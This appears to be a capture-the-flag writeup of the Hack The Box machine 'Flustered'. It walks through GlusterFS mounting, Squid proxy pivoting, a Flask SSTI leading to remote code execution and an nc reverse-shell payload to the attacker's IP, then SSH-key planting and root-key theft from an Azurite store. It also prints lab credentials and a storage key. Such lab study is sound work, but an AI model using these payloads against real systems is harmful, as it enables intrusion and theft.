---
layout: post
title: "Flustered"
date: 2025-11-05 10:00:00
categories: writeups
tags: [Linux, glusterFS, squid, squidProxy, user pivoting, internal enum, Azure Storage pentesting]
lang: en
image: /assets/images/flustered/box-flustered.png
---

![]({{ "/assets/images/flustered/flustered-card.png" | relative_url }})

# Concepts seen on the machine
```
- Mounting GlusterFS volume
- Using SquidProxy to discover internal applications
- SSTI to gain initial access
- Extracting Gluster certificates to mount vol1 and creating ssh-keys to pivot users
- Enumerating the internal Docker network
- Interacting with Azure Storage
[*] Bonus
	- How to make Azure Storage work
	- Setting up SquidProxy with FoxyProxy
```

# Enumeration & Initial Foothold

>📍IP
>```
>10.10.11.131
>```

>🔐 Users:Passwords
```
lance.friedman:o>WJ5-jD<5^m3
```

>🪪 Domains
```
flustered.htb
steampunk-era.htb
flustered
```
## 🔎 nmap scanning

```python
nmap -p- -sS -Pn -n -vvv --min-rate 3000 -oG all-Ports 10.10.11.131
```

```
nmap --top-ports=300 -sU -vvv -oG UDP-Ports 10.10.11.131
```

```
nmap -p -sCV -vvv -oN Targeted  10.10.11.131  
```

```python
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:31:fc:38:ff:2f:a7:fd:89:a3:48:bf:ed:6b:97:cb (RSA)
|   256 e5:f8:27:4c:38:40:59:e0:56:e7:39:98:6b:86:d7:3a (ECDSA)
|_  256 62:6d:ab:81:fc:d2:f7:a1:c1:9d:39:cc:f2:7a:a1:6a (ED25519)
80/tcp    open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: steampunk-era.htb - Coming Soon
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3128/tcp  open  http-proxy  Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
24007/tcp open  rpcbind
49152/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=flustered.htb
| Not valid before: 2021-11-25T15:27:31
|_Not valid after:  2089-12-13T15:27:31
|_ssl-date: TLS randomness does not represent time
49153/tcp open  rpcbind
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.31 seconds
```


## 80 - HTTP

We launch whatweb to see information about the technologies in use, we see a subdomain

![]({{ "/assets/images/flustered/Pasted image 20251105181431.png" | relative_url }})

There is absolutely nothing on the website. :(

## 111 - RPC

![]({{ "/assets/images/flustered/Pasted image 20251105181841.png" | relative_url }})

## 3128 - SQUID

We access via URL

![]({{ "/assets/images/flustered/Pasted image 20251105182136.png" | relative_url }})

We tried making a request using this proxy with curl, and looking at the headers, we saw that it requires authentication.

![]({{ "/assets/images/flustered/Pasted image 20251105182632.png" | relative_url }})


```
curl http://user:pass@flustered.htb:3128 http://flustered.htb --head
```

We use the spose tool to list ports using the proxy that may be open internally, which would not be visible if not going through the proxy.

[spose](https://github.com/aancw/spose)

We execute it by passing the credentials we have listed through the URL.

## 24007, 49152 -  GlusterFS

We found that it is a file sharing system, basically an NFS, so we listed the volumes with gluster.

![]({{ "/assets/images/flustered/Pasted image 20251105191227.png" | relative_url }})

We see that there are two, we will try to mount them on our system to see what they contain.

![]({{ "/assets/images/flustered/Pasted image 20251105191311.png" | relative_url }})

You are not mounting the containers correctly because we are getting a resolution failed to flustered error.

![]({{ "/assets/images/flustered/Pasted image 20251105191451.png" | relative_url }})

We update /etc/hosts and try again.

![]({{ "/assets/images/flustered/Pasted image 20251105191538.png" | relative_url }})

We verify that we can mount vol2 and view files, listing the important ones.

We found an .ibd file, which usually stores passwords. In this case, they would belong to a Squid proxy user.

![]({{ "/assets/images/flustered/Pasted image 20251105192115.png" | relative_url }})

```
lance.friedman:o>WJ5-jD<5^m3
```

We set up a proxy in FoxyProxy so that we can use this proxy and these credentials.

![]({{ "/assets/images/flustered/Pasted image 20251105195554.png" | relative_url }})


Now, when passing through this proxy, we don't have to access the IP or anything else, because the requests go from the proxy, so we try using `127.0.0.1` and see that the page changes, which makes us think that there may be internal routes, so we fuzz for routes.

```
curl -x http://lance.friedman:o>WJ5-jD<5^m3@flustered.htb:3128 http://127.0.0.1
```

![]({{ "/assets/images/flustered/Pasted image 20251105195516.png" | relative_url }})

We fuzz routes, *IMPORTANT, as the password contains special characters such as <, it must be URL-encoded*

```
gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --proxy "http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@flustered.htb:3128"
```

We find a route `/app`, we fuzz inside it again filtering by file extensions, such as `.py and .php`, and we find three other routes, `/templates`, `/static` and `/config`, and an `app.py` that returns a 200.

![]({{ "/assets/images/flustered/Pasted image 20251105201522.png" | relative_url }})

Upon accessing, it downloads the code, which is as follows

```
from flask import Flask, render_template_string, url_for, json, request
app = Flask(__name__)

def getsiteurl(config):
  if config and "siteurl" in config:
    return config["siteurl"]
  else:
    return "steampunk-era.htb"

@app.route("/", methods=['GET', 'POST'])
def index_page():
  # Will replace this with a proper file when the site is ready
  config = request.json

  template = f'''
    <html>
    <head>
    <title>{getsiteurl(config)} - Coming Soon</title>
    </head>
    <body style="background-image: url('{url_for('static', filename='steampunk-3006650_1280.webp')}');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>
  '''
  return render_template_string(template)

if __name__ == "__main__":
  app.run()
```

We observe that you are attempting to load a ‘configuration’ of a config parameter, and if there is nothing, it displays `steampunk-era.htb`.

Analysing the code, it receives data from a POST request from a `siteurl` parameter and displays it, but it is not properly sanitised, which may mean that it is vulnerable to an SSTI. We tried sending it a typical payload, such as `{{ 7 * 7 }}`, and if it interprets it, it will be vulnerable.

```
curl -X POST -H "Content-Type: application/json" -d '{"siteurl": "{{ 7 * 7 }}"}' http://10.10.11.131/
```

![]({{ "/assets/images/flustered/Pasted image 20251105202130.png" | relative_url }})


We see that the attack is happening, we pass the request to burpsuite with `-x http://127.0.0.1:8080` and we will execute an RCE.

```
"siteurl"="{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}{% endraw %}"
```

![]({{ "/assets/images/flustered/Pasted image 20251105202455.png" | relative_url }})


We will send ourselves a reverse shell.

```
"siteurl"="{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/usr/bin/nc 10.10.14.6 6666 -e /bin/bash').read() }}{% endraw %}"
```

![]({{ "/assets/images/flustered/Pasted image 20251105202628.png" | relative_url }})

# Privesc

We list basic information about the machine and discover a user named `jeniffer`.

![]({{ "/assets/images/flustered/Pasted image 20251105202733.png" | relative_url }})

Volume 1 is owned by Jennifer.

![]({{ "/assets/images/flustered/Pasted image 20251105203737.png" | relative_url }})

We launched Linpeas to list relevant information.

![]({{ "/assets/images/flustered/Pasted image 20251105204239.png" | relative_url }})

We have seen the `glusterfs.pem` file before. When we tried to mount vol1, we were unable to do so due to the following error

![]({{ "/assets/images/flustered/Pasted image 20251105203956.png" | relative_url }})


We download the certificate, move it to the path where it is being called, `/etc/ssl`, and try to mount the volume, but we get an error again, asking for the .key.

![]({{ "/assets/images/flustered/Pasted image 20251105204702.png" | relative_url }})

As it will ask us for all of them, we download them all and put them in `/etc/ssl`, and now it lets us mount the volume. 

![]({{ "/assets/images/flustered/Pasted image 20251105204915.png" | relative_url }})

We see that it is jennifer's /home directory. If we can write, we will create some SSH keys and log in.

![]({{ "/assets/images/flustered/Pasted image 20251105205148.png" | relative_url }})

![]({{ "/assets/images/flustered/Pasted image 20251105205201.png" | relative_url }})

And now we have access as jennifer with ssh.

![]({{ "/assets/images/flustered/Pasted image 20251105205225.png" | relative_url }})

We found a file in var backups called key, which we can read, as well as several backups.

![]({{ "/assets/images/flustered/Pasted image 20251106084655.png" | relative_url }})

Inside the machine, we list and see that there is a new interface, so we will list the hosts on it. It is a Docker network.

![]({{ "/assets/images/flustered/Pasted image 20251106091510.png" | relative_url }})

We will use the scripts we used to enumerate in DMZ01, edit it slightly to cover all hosts on the network, and launch it.

![]({{ "/assets/images/flustered/Pasted image 20251106095226.png" | relative_url }})

We find a host, set up a tunnel with Ligolo, and scan the ports.

![]({{ "/assets/images/flustered/Pasted image 20251106100016.png" | relative_url }})

We found port 10000 open, tried to access it, and got an error.

![]({{ "/assets/images/flustered/Pasted image 20251106100125.png" | relative_url }})

Searching for the error on Google, we see that it is related to Azure Storage.

![]({{ "/assets/images/flustered/Pasted image 20251106100247.png" | relative_url }})

In particular, looking at the headers, we see that it is an Azurite Blob.

![]({{ "/assets/images/flustered/Pasted image 20251106100402.png" | relative_url }})


We will download the `storage-explorer` tool with snap to list this Azure container. We will keep in mind the key we saw earlier for Jennifer in case we are asked for it. We found it with linpeas in `/var/backups`.


```
FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==
```

We install the storage explorer and add the line below according to the documentation.

```
sudo apt update
sudo apt install snapd
sudo systemctl start snapd
sudo snap install storage-explorer
snap connect storage-explorer:password-manager-service :password-manager-service
```

Inside, it is not enough to have the tunnel, so we will forward the port locally so that it can be accessed locally.

![]({{ "/assets/images/flustered/Pasted image 20251106102209.png" | relative_url }})

![]({{ "/assets/images/flustered/Pasted image 20251106102235.png" | relative_url }})

When we try to access it, we get an error message.

```
ProducerError:{
  "name": "RestError",
  "message": "{\"name\":\"RestError\",\"code\":\"InvalidHeaderValue\",\"statusCode\":400,\"details\":{\"errorCode\":\"InvalidHeaderValue\",\"connection\":\"keep-alive\",\"content-type\":\"application/xml\",\"date\":\"Thu, 06 Nov 2025 09:24:18 GMT\",\"keep-alive\":\"timeout=5\",\"server\":\"Azurite-Blob/3.14.3\",\"transfer-encoding\":\"chunked\",\"x-ms-request-id\":\"bdaf7a86-04a4-43c6-bb4a-cd146bed27a4\",\"message\":\"The value for one of the HTTP headers is not in the correct format.\\nRequestId:bdaf7a86-04a4-43c6-bb4a-cd146bed27a4\\nTime:2025-11-06T09:24:18.402Z\",\"code\":\"InvalidHeaderValue\",\"HeaderName\":\"x-ms-version\",\"HeaderValue\":\"2025-07-05\"}}"
}
```

We continue to receive the error, so, looking for a solution, we found that the tool works better from Ubuntu. We just have to declare the environment variable with the API version that this version of Azurite accepts, which is 2023-11-03, for it to be valid, and launch the `storage-explorer`, and we will see that there is an `ssh-keys` folder.

```
export AZURE_STORAGE_API_VERSION=2023-11-03
```

![]({{ "/assets/images/flustered/Pasted image 20251106121643.png" | relative_url }})

We take the root one and authenticate ourselves via SSH.

![]({{ "/assets/images/flustered/Pasted image 20251106121838.png" | relative_url }})

![]({{ "/assets/images/flustered/Pasted image 20251106121909.png" | relative_url }})



